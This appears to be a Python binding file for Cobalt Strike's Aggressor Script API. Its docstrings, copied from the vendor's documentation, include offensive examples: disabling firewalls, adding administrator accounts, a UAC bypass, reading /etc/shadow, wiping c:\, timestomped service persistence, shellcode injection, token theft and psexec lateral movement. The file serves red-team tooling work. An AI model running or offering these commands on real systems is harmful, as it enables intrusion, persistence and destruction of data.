    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a PowerShell cmdlet
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the cmdlet and arguments
        $3 - [optional] if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle.
        Example
        # get the version of PowerShell...
        alias powerver {
            bpowershell($1, '$PSVersionTable.PSVersion');
        }

    """

    return engine.call('bpowershell', args, silent=silent, fork=fork, sync=sync)


def bpowershell_import(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Import a PowerShell script into a Beacon
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the path to the local file to import
        Example
        # quickly run PowerUp
        alias powerup {
            bpowershell_import($1, script_resource("PowerUp.ps1"));
            bpowershell($1, "Invoke-AllChecks");
        }

    """

    return engine.call('bpowershell_import', args, silent=silent, fork=fork, sync=sync)


def bpowershell_import_clear(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Clear the imported PowerShell script from a Beacon session.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        alias powershell-clear {
            bpowershell_import_clear($1);
        }

    """

    return engine.call('bpowershell_import_clear', args, fork=fork, sync=sync)


def bppid(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Set a parent process for Beacon's child processes
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the parent process ID. Specify 0 to reset to default behavipr.
        Notes
        1. The current session must have rights to access the specified parent process.
        2. Attempts to spawn post-ex jobs under parent processes in another desktop session may fail. This limitation is due to how Beacon launches its "temporary" processes for post-exploitation jobs and injects code into them.
        Example
        # getexplorerpid($bid, &callback);
        sub getexplorerpid {
            bps($1, lambda({
                local('$pid $name $entry');
                foreach $entry (split("\n", $2)) {
                    ($name, $null, $pid) = split("\\s+", $entry);
                    if ($name eq "explorer.exe") {
                        [$callback: $1, $pid];
                    }
                }
            }, $callback => $2));
        }

        alias prepenv {
            btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
            getexplorerpid($1, {
                bppid($1, $2);
            });
        }

    """

    return engine.call('bppid', args, fork=fork, sync=sync)


def bps(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Task a Beacon to list processes
        Variations
        bps($1);

        Output the results to the Beacon console.
        bps($1, &callback);

        Route results to the specified callback function.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - an optional callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = results
        Example
        on beacon_initial {
            bps($1);
        }

    """

    return engine.call('bps', args, fork=fork, sync=sync)


def bpsexec(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it. Clean up is included too.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to spawn a payload onto
        $3 - the listener to spawn
        $4 - the share to copy the executable to
        $5 - the architecture of the payload to generate/deliver (x86 or x64)
        Example
        brev2self();
        bloginuser($1, "CORP", "Administrator", "toor");
        bpsexec($1, "172.16.48.3", "my listener", "ADMIN\$");

    """

    return engine.call('bpsexec', args, fork=fork, sync=sync)


def bpsexec_command(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to run the command on
        $3 - the name of the service to create
        $4 - the command to run.
        Example
        # disable the firewall on a remote target
        # beacon> shieldsdown [target]
        alias shieldsdown {
            bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
        }

    """

    return engine.call('bpsexec_command', args, fork=fork, sync=sync)


def bpsexec_psh(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.0. Use &bjump with psexec_psh option.
    """

    return engine.call('bpsexec_psh', args, fork=fork, sync=sync)


def bpsinject(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Inject Unmanaged PowerShell into a specific process and run the specified cmdlet
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process to inject the session into
        $3 - the process architecture (x86 | x64)
        $3 - the cmdlet to run
        Example
        bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");

    """

    return engine.call('bpsinject', args, fork=fork, sync=sync)


def bpwd(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to print its current working directory
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        alias pwd {
            bpwd($1);
        }

    """

    return engine.call('bpwd', args, silent=silent, fork=fork, sync=sync)


def breg_query(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to query a key within the registry.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the path to the key
        $3 - x86|x64 - which view of the registry to use
        Example
        alias typedurls {
            breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
        }

    """

    return engine.call('breg_query', args, fork=fork, sync=sync)


def breg_queryv(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to query a value within a registry key.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the path to the key
        $3 - the name of the value to query
        $4 - x86|x64 - which view of the registry to use
        Example
        alias winver {
            breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
        }

    """

    return engine.call('breg_queryv', args, fork=fork, sync=sync)


def bremote_exec(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command on a remote target.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the remote execute method to use
        $3 - the remote target
        $4 - the command and arguments to run
        Example
        # winrm [target] [command+args]
        alias winrm-exec {
            bremote_exec($1, "winrm", $2, $3); {
        }

        See Also
        &beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &beacon_remote_exec_methods

    """

    return engine.call('bremote_exec', args, fork=fork, sync=sync)


def brev2self(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to drop its current token. This calls the RevertToSelf() Win32 API.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        alias rev2self {
            brev2self($1);
        }

    """

    return engine.call('brev2self', args, fork=fork, sync=sync)


def brm(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to remove a file or folder.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file or folder to remove
        Example
        # nuke the system
        brm($1, "c:\\");

    """

    return engine.call('brm', args, silent=silent, fork=fork, sync=sync)


def brportfwd(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to setup a reverse port forward.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the port to bind to on the target
        $3 - the host to forward connections to
        $4 - the port to forward connections to
        Example
        brportfwd($1, 80, "192.168.12.88", 80);

    """

    return engine.call('brportfwd', args, fork=fork, sync=sync)


def brportfwd_local(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to setup a reverse port forward that routes that the current Cobalt Strike client.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the port to bind to on the target
        $3 - the host to forward connections to
        $4 - the port to forward connections to
        Example
        brportfwd_local($1, 80, "192.168.12.88", 80);

    """

    return engine.call('brportfwd_local', args, fork=fork, sync=sync)


def brportfwd_stop(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to stop a reverse port forward
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the port bound on the target
        Example
        brportfwd_stop($1, 80);

    """

    return engine.call('brportfwd_stop', args, fork=fork, sync=sync)


def brun(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Notes
        This capability is a simpler version of the &beacon_execute_job function. The latter function is what &bpowershell and &bshell build on. This is a (slightly) more OPSEC-safe option to run commands and receive output from them.
        Example
        alias w {
            brun($1, "whoami /all");
        }

    """

    return engine.call('brun', args, fork=fork, sync=sync)


def brunas(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command as another user.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password
        $5 - the command to run
        Example
        brunas($1, "CORP", "Administrator", "toor", "notepad.exe");

    """

    return engine.call('brunas', args, fork=fork, sync=sync)


def brunasadmin(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command in a high-integrity context (bypasses UAC).
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and its arguments.
        Notes
        This command uses the Token Duplication UAC bypass. This bypass has a few requirements:

        Your user must be a local admin
        If Always Notify is enabled, an existing high integrity process must be running in the current desktop session.

        Example
        # disable the firewall
        brunasadmin($1, "cmd.exe /C netsh advfirewall set allprofiles state off");

    """

    return engine.call('brunasadmin', args, fork=fork, sync=sync)


def brunu(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a process under another process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID of the parent process
        $3 - the command + arguments to run
        Example
        brunu($1, 1234, "notepad.exe");

    """

    return engine.call('brunu', args, fork=fork, sync=sync)


def bscreenshot(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to take a screenshot
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "&Screenshot" {
            binput($1, "screenshot");
            bscreenshot($1);
        }

    """

    return engine.call('bscreenshot', args, silent=silent, fork=fork, sync=sync)


def bscreenwatch(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to take periodic screenshots
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        item "&Screenwatch" {
            binput($1, "screenwatch");
            bscreenwatch($1);
        }

    """

    return engine.call('bscreenwatch', args, fork=fork, sync=sync)


def bsetenv(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to set an environment variable
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the environment variable to set
        $3 - the value to set the environment variable to (specify $null to unset the variable)
        Example
        alias tryit {
            bsetenv($1, "foo", "BAR!");
            bshell($1, "echo %foo%");
        }

    """

    return engine.call('bsetenv', args, fork=fork, sync=sync)


def bshell(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command with cmd.exe
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the command and arguments to run
        Example
        alias adduser {
            bshell($1, "net user $2 B00gyW00gy1234! /ADD");
            bshell($1, "net localgroup \"Administrators\" $2 /ADD");
        }

    """

    return engine.call('bshell', args, silent=silent, fork=fork, sync=sync)


def bshinject(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Inject shellcode (from a local file) into a specific process
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID of the process to inject into
        $3 - the process architecture (x86 | x64)
        $4 - the local file with the shellcode
        Example
        bshinject($1, 1234, "x86", "/path/to/stuff.bin");

    """

    return engine.call('bshinject', args, fork=fork, sync=sync)


def bshspawn(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Spawn shellcode (from a local file) into another process. This function benefits from Beacon's configuration to spawn post-exploitation jobs (e.g., spawnto, ppid, etc.)
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process architecture (x86 | x64)
        $3 - the local file with the shellcode
        Example
        bshspawn($1, "x86", "/path/to/stuff.bin");

    """

    return engine.call('bshspawn', args, fork=fork, sync=sync)


def bsleep(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to change its beaconing interval and jitter factor.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the number of seconds between beacons.
        $3 - the jitter factor [0-99]
        Example
        alias stealthy {
            # sleep for 1 hour with 30% jitter factor
            bsleep($1, 60 * 60, 30);
        }

    """

    return engine.call('bsleep', args, silent=silent, fork=fork, sync=sync)


def bsocks(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Start a SOCKS proxy server associated with a beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the port to bind to
        Example
        alias socks1234 {
            bsocks($1, 1234);
        }

    """

    return engine.call('bsocks', args, fork=fork, sync=sync)


def bsocks_stop(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Stop SOCKS proxy servers associated with the specified Beacon.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        alias stopsocks {
            bsocks_stop($1);
        }

    """

    return engine.call('bsocks_stop', args, fork=fork, sync=sync)


def bspawn(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn a new session
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the listener to target.
        $3 - the architecture to spawn a process for (defaults to current beacon arch)
        Example
        item "&Spawn" {
            openPayloadHelper(lambda({
                binput($bids, "spawn x86 $1");
                bspawn($bids, $1, "x86");
            }, $bids => $1));
        }

    """

    return engine.call('bspawn', args, fork=fork, sync=sync)


def bspawnas(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn a session as another user.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the domain of the user
        $3 - the user's username
        $4 - the user's password
        $5 - the listener to spawn
        Example
        bspawnas($1, "CORP", "Administrator", "toor", "my listener");

    """

    return engine.call('bspawnas', args, fork=fork, sync=sync)


def bspawnto(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Change the default program Beacon spawns to inject capabilities into.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the architecture we're modifying the spawnto setting for (x86, x64)
        $3 - the program to spawn
        Notes
        The value you specify for spawnto has to work from x86->x86, x86->x64, x64->x86, and x64->x86 contexts. This is tricky. Follow these rules and you'll be OK:
        1. Always specify the full path to the program you want Beacon to spawn for its post-ex jobs.
        2. Environment variables (e.g., %windir%) are OK within these paths.
        3. Do not specify %windir%\system32 or c:\windows\system32 directly. Always use syswow64 (x86) and sysnative (x64). Beacon will adjust these values to system32 if it's necessary.
        4. For an x86 spawnto value, you must specify an x86 program. For an x64 spawnto value, you must specify an x64 program.
        Example
        # let's make everything lame.
        on beacon_initial {
            binput($1, "prep session with new spawnto values.");
            bspawnto($1, "x86", "%windir%\\syswow64\\notepad.exe");
            bspawnto($1, "x64", "%windir%\\sysnative\\notepad.exe");
        }

    """

    return engine.call('bspawnto', args, fork=fork, sync=sync)


def bspawnu(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn a session under another process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the process to spawn this session under
        $3 - the listener to spawn
        Example
        bspawnu($1, 1234, "my listener");

    """

    return engine.call('bspawnu', args, fork=fork, sync=sync)


def bspunnel(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward)
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the host of the controller
        $3 - the port of the controller
        $4 - a file with position-independent code to execute in a temporary process.
        Example
        bspunnel($1, "127.0.0.1", 4444, script_resource("agent.bin"));

    """

    return engine.call('bspunnel', args, fork=fork, sync=sync)


def bspunnel_local(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Spawn and tunnel an agent through this Beacon (via a target localhost-only reverse port forward). Note: this reverse port forward tunnel traverses through the Beacon chain to the team server and, via the team server, out through the requesting Cobalt Strike client.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the host of the controller
        $3 - the port of the controller
        $4 - a file with position-independent code to execute in a temporary process.
        Example
        bspunnel_local($1, "127.0.0.1", 4444, script_resource("agent.bin"));

    """

    return engine.call('bspunnel_local', args, fork=fork, sync=sync)


def bssh(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn an SSH session.
        Arguments
        $1 - id for the beacon. This may be an array or a single ID.
        $2 - IP address or hostname of the target
        $3 - port (e.g., 22)
        $4 - username
        $5 - password
        Example
        bssh($1, "172.16.20.128", 22, "root", "toor");

    """

    return engine.call('bssh', args, fork=fork, sync=sync)


def bssh_key(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to spawn an SSH session.
        Arguments
        $1 - id for the beacon. This may be an array or a single ID.
        $2 - IP address or hostname of the target
        $3 - port (e.g., 22)
        $4 - username
        $5 - key data (as a string)
        Example
        $handle = openf("/path/to/key.pem");
        $keydata = readb($handle, -1);
        closef($handle);

        bssh_key($1, "172.16.20.128", 22, "root", $keydata);

    """

    return engine.call('bssh_key', args, fork=fork, sync=sync)


def bstage(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED This function is removed in Cobalt Strike 4.0. Use &beacon_stage_tcp or &beacon_stage_pipe to explicitly stage a payload. Use &beacon_link to link to it.
    """

    return engine.call('bstage', args, fork=fork, sync=sync)


def bsteal_token(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to steal a token from a process.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the PID to take the token from
        Example
        alias steal_token {
            bsteal_token($1, int($2));
        }

    """

    return engine.call('bsteal_token', args, fork=fork, sync=sync)


def bsudo(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to run a command via sudo (SSH sessions only)
        Arguments
        $1 - the id for the session. This may be an array or a single ID.
        $2 - the password for the current user
        $3 - the command and arguments to run
        Example
        # hashdump [password]
        ssh_alias hashdump {
            bsudo($1, $2, "cat /etc/shadow");
        }

    """

    return engine.call('bsudo', args, fork=fork, sync=sync)


def btask(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Report a task acknowledgement for a Beacon. This task acknowledgement will also contribute to the narrative in Cobalt Strike's Activity Report and Sessions Report.
        Arguments
        $1 - the id for the beacon to post to
        $2 - the text to post
        $3 - a string with MITRE ATT&CK Tactic IDs. Use a comma and a space to specify multiple IDs in one string.
        https://attack.mitre.org
        Example
        alias foo {
            btask($1, "User tasked beacon to foo", "T1015");
        }

    """

    return engine.call('btask', args, fork=fork, sync=sync)


def btimestomp(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to change the file modified/accessed/created times to match another file.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the file to update timestamp values for
        $3 - the file to grab timestamp values from
        Example
        alias persist {
            bcd($1, "c:\\windows\\system32");
            bupload($1, script_resource("evil.exe"));
            btimestomp($1, "evil.exe", "cmd.exe");
            bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
            bshell($1, 'sc start netsrv');
        }

    """

    return engine.call('btimestomp', args, silent=silent, fork=fork, sync=sync)


def bunlink(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask Beacon to delink a Beacon its connected to over a TCP socket or named pipe.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target host to unlink (specified as an IP address)
        $3 - [optional] the PID of the target session to unlink
        Example
        bunlink($1, "172.16.48.3");

    """

    return engine.call('bunlink', args, fork=fork, sync=sync)


def bupload(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask a Beacon to upload a file
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path to the file to upload
        Example
        bupload($1, script_resource("evil.exe"));

    """

    return engine.call('bupload', args, fork=fork, sync=sync)


def bupload_raw(*args, silent=False, fork=None, sync=True):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Ask a Beacon to upload a file
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the remote file name of the file
        $3 - the raw content of the file
        $4 - [optional] the local path to the file (if there is one)
        Example
        $data = artifact("my listener", "exe");
        bupload_raw($1, "\\\\DC\\C$\\foo.exe", $data);

    """

    return engine.call('bupload_raw', args, silent=silent, fork=fork, sync=sync)


def bwdigest(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.0. Use &bmimikatz directly.
    """

    return engine.call('bwdigest', args, fork=fork, sync=sync)


def bwinrm(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.0. Use &bjump with winrm or winrm64 built-in options.
    """

    return engine.call('bwinrm', args, fork=fork, sync=sync)


def bwmi(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        REMOVED Removed in Cobalt Strike 4.0.
    """

    return engine.call('bwmi', args, fork=fork, sync=sync)


def call(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Issue a call to the team server.
        Arguments
        $1 - the command name
        $2 - a callback to receive a response to this request. The callback will receive two arguments. The first is the call name. The second is the response.
        ... - one or more arguments to pass into this call.
        Example
        call("aggressor.ping", { warn(@_); }, "this is my value");

    """

    return engine.call('call', args, fork=fork, sync=sync)


def closeClient(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Close the current Cobalt Strike team server connection.
        Example
        closeClient();

    """

    return engine.call('closeClient', args, fork=fork, sync=sync)


def colorPanel(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Generate a Java component to set accent colors within Cobalt Strike's data model
        Arguments
        $1 - the prefix
        $2 - an array of IDs to change colors for
        Example
        popup targets {
            menu "&Color" {
                insert_component(colorPanel("targets", $1));
            }
        }

        See also
        &highlight

    """

    return engine.call('colorPanel', args, fork=fork, sync=sync)


def credential_add(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Add a credential to the data model
        Arguments
        $1 - username
        $2 - password
        $3 - realm
        $4 - source
        $5 - host
        Example
        command falsecreds {
            for ($x = 0; $x < 100; $x++) {
                credential_add("user $+ $x", "password $+ $x");
            }
        }

    """

    return engine.call('credential_add', args, fork=fork, sync=sync)


def credentials(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of application credentials in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each credential entry.
        Example
        printAll(credentials());

    """

    return engine.call('credentials', args, fork=fork, sync=sync)


def data_keys(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        List the query-able keys from Cobalt Strike's data model
        Returns
        A list of keys that you may query with &data_query
        Example
        foreach $key (data_keys()) {
            println("\n\c4=== $key ===\n");
            println(data_query($key));
        }

    """

    return engine.call('data_keys', args, fork=fork, sync=sync)


def data_query(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Queries Cobalt Strike's data model
        Arguments
        $1 - the key to pull from the data model
        Returns
        A Sleep representation of the queried data.
        Example
        println(data_query("targets"));

    """

    return engine.call('data_query', args, fork=fork, sync=sync)


def dbutton_action(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called. You may add multiple buttons to a dialog. Cobalt Strike will line these buttons up in a row and center them at the bottom of the dialog.
        Arguments
        $1 - the $dialog object
        $2 - the button label
        Example
        dbutton_action($dialog, "Start");
        dbutton_action($dialog, "Stop");

    """

    return engine.call('dbutton_action', args, fork=fork, sync=sync)


def dbutton_help(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a Help button to a &dialog. When this button is pressed, Cobalt Strike will open the user's browser to the specified URL.
        Arguments
        $1 - the $dialog object
        $2 - the URL to go to
        Example
        dbutton_help($dialog, "http://www.google.com");

    """

    return engine.call('dbutton_help', args, fork=fork, sync=sync)


def dialog(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Create a dialog. Use &dialog_show to show it.
        Arguments
        $1 - the title of the dialog
        $2 - a %dictionary mapping row names to default values
        $3 - a callback function. Called when the user presses a &dbutton_action button. $1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value.
        Returns
        A scalar with a $dialog object.
        Example
        sub callback {
            # prints: Pressed Go, a is: Apple
            println("Pressed $2 $+ , a is: " . $3['a']);
        }

        $dialog = dialog("Hello World", %(a => "Apple", b => "Bat"), &callback);
        drow_text($dialog, "a", "Fruit:  ");
        drow_text($dialog, "b", "Rodent: ");
        dbutton_action($dialog, "Go");
        dialog_show($dialog);

    """

    return engine.call('dialog', args, fork=fork, sync=sync)


def dialog_description(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a description to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the description of this dialog
        Example
        dialog_description($dialog, "I am the Hello World dialog.");

    """

    return engine.call('dialog_description', args, fork=fork, sync=sync)


def dialog_show(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Shows a &dialog.
        Arguments
        $1 - the $dialog object
        Example
        dialog_show($dialog);

    """

    return engine.call('dialog_show', args, fork=fork, sync=sync)


def dispatch_event(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Call a function in Java Swing's Event Dispatch Thread. Java's Swing Library is not thread safe. All changes to the user interface should happen from the Event Dispatch Thread.
        Arguments
        $1 - the function to call
        Example
        dispatch_event({
            println("Hello World");
        });

    """

    return engine.call('dispatch_event', args, fork=fork, sync=sync)


def downloads(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Returns a list of downloads in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each downloaded file.
        Example
        printAll(downloads());

    """

    return engine.call('downloads', args, fork=fork, sync=sync)


def drow_beacon(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a beacon selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        drow_beacon($dialog, "bid", "Session: ");

    """

    return engine.call('drow_beacon', args, fork=fork, sync=sync)


def drow_checkbox(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a checkbox to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        $4 - the text next to the checkbox
        Example
        drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");

    """

    return engine.call('drow_checkbox', args, fork=fork, sync=sync)


def drow_combobox(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

        Adds a combobox to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        $4 - an array of options to choose from
        Example
        drow_combobox($dialog, "combo", "Options", @("apple", "bat", "cat"));

    """

    return engine.call('drow_combobox', args, fork=fork, sync=sync)


def drow_exploits(*args, fork=None, sync=True):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:

